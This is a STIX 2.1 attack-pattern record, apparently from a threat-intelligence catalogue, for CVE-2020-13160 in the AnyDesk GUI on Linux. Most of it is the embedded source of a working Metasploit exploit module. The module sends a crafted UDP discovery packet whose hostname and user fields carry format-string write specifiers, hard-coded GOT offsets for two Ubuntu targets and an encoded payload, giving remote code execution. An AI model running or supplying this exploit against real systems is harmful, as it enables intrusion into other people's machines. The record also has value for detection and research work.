{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66a67737-088a-4e00-825e-d4d6ae6658ab",
    "created": "2024-08-14T16:57:41.870776Z",
    "modified": "2024-08-14T16:57:41.87078Z",
    "name": "AnyDesk GUI Format String Write",
    "description": " The AnyDesk GUI is vulnerable to a remotely exploitable format string vulnerability. By sending a specially crafted discovery packet, an attacker can corrupt the frontend process when it loads or refreshes. While the discovery service is always running, the GUI frontend must be started to trigger the vulnerability. On successful exploitation, code is executed within the context of the user who started the AnyDesk GUI. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/cve_2020_13160_anydesk.rb",
            "external_id": "cve_2020_13160_anydesk.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13160"
        },
        {
            "source_name": "reference",
            "url": "https://devel0pment.de/?p=1881"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AnyDesk GUI Format String Write',\n        'Description' => %q{\n          The AnyDesk GUI is vulnerable to a remotely exploitable format string vulnerability. By sending a specially\n          crafted discovery packet, an attacker can corrupt the frontend process when it loads or refreshes. While the\n          discovery service is always running, the GUI frontend must be started to trigger the vulnerability. On\n          successful exploitation, code is executed within the context of the user who started the AnyDesk GUI.\n        },\n        'Author' => [\n          'scryh', # vulnerability discovery and original exploit\n          'Spencer McIntyre' # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2020-13160' ],\n          [ 'URL', 'https://devel0pment.de/?p=1881' ]\n        ],\n        'Payload' => {\n          'Space' => 512,\n          'BadChars' => \"\\x00\\x25\\x26\"\n        },\n        'Platform' => 'linux',\n        'Arch' => ARCH_X64,\n        'DefaultOptions' => {\n          'CPORT' => 50001,\n          'PrependFork' => true,\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ SCREEN_EFFECTS ],\n          'Reliability' => [ UNRELIABLE_SESSION ]\n        },\n        'Targets' => [\n          [\n            'Anydesk 5.5.2 Ubuntu 20.04 x64',\n            { 'stkref1' => 109, 'stkref2' => 125, 'time@got.plt' => 0x119ddc0 - 139 }\n          ],\n          [\n            'Anydesk 5.5.2 Ubuntu 18.04 x64',\n            { 'stkref1' => 93, 'stkref2' => 165, 'time@got.plt' => 0x119ddc0 - 135 }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-06-16'\n      )\n    )\n\n    register_options([\n      Opt::RPORT(50001)\n    ])\n    register_advanced_options([\n      OptAddressLocal.new('SRVHOST', [ true, 'The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.', '0.0.0.0' ]),\n      OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 50001 ])\n    ])\n  end\n\n  def build_discover_packet(hn, user, inf, func)\n    buf = \"\\x3e\\xd1\\x01\"\n    buf << [4919].pack('N')\n    buf << [0].pack('N')\n    buf << \"\\x02\\x01\" # os\n    buf << [hn.length].pack('N') << hn\n    buf << [user.length].pack('N') << user\n    buf << [0].pack('N')\n    buf << [inf.length].pack('N') << inf\n    buf << \"\\x00\"\n    buf << [func.length].pack('N') << func\n    buf << \"\\x02\\xc3\\x51\"\n  end\n\n  def discover\n    server_sock = Rex::Socket::Udp.create(\n      'LocalHost' => datastore['SRVHOST'],\n      'LocalPort' => datastore['SRVPORT'],\n      'Context' => {\n        'Msf' => framework,\n        'MsfExploit' => self\n      }\n    )\n\n    client_sock = connect_udp(false, {\n      'RPORT' => datastore['RPORT'],\n      'CPORT' => 0\n    })\n    client_sock.put(build_discover_packet(rand_text_alpha(rand(5..9)), rand_text_alpha(rand(5..9)), 'ad', 'main'))\n\n    timeout = 10\n    while timeout > 0\n      start_time = Time.now\n      response, host, = server_sock.recvfrom(8192, timeout)\n      break if host == datastore['RHOST']\n\n      timeout = Time.now - start_time\n    end\n\n    return nil unless response[0..2].bytes == [0x3e, 0xd1, 0x01]\n    return nil unless response[11] == \"\\x02\"\n\n    disconnect_udp(client_sock)\n    server_sock.close\n\n    hostname = response[17..17 + response[13..16].unpack1('N')]\n    report_host(host: datastore['RHOST'], name: hostname)\n\n    {\n      hostname: hostname,\n      os: response[12] == \"\\x02\" ? :linux : nil\n    }\n  end\n\n  def check\n    info = discover\n    return CheckCode::Safe if info.nil?\n\n    CheckCode::Detected(\"Remote hostname: #{info[:hostname]}\")\n  end\n\n  def bad_unicode\n    [ rand(0x80..0x90), rand(0..0xff) ].pack('CC')\n  end\n\n  def exploit\n    info = discover\n    fail_with(Failure::NotVulnerable, 'Discovery failed to detect the AnyDesk service') if info.nil?\n    fail_with(Failure::NoTarget, 'Discovery determined the remote host OS is incompatible') unless info[:os] == :linux\n\n    print_status(\"Discovered the remote service (hostname: #{info[:hostname]}, os: #{info[:os]})\")\n\n    connect_udp\n\n    hn = \"#{bad_unicode}%1$*1$x%18x%#{target['stkref2']}$ln\"\n    hn << payload.encoded\n    udp_sock.put(build_discover_packet(hn, \"#{bad_unicode}%#{target['time@got.plt']}x%#{target['stkref1']}$ln\", 'ad', 'main'))\n    print_status('Sent exploit frame, waiting for the GUI to refresh to trigger the vulnerability...')\n  ensure\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-16",
    "x_mitre_platforms": [
        "linux'"
    ]
}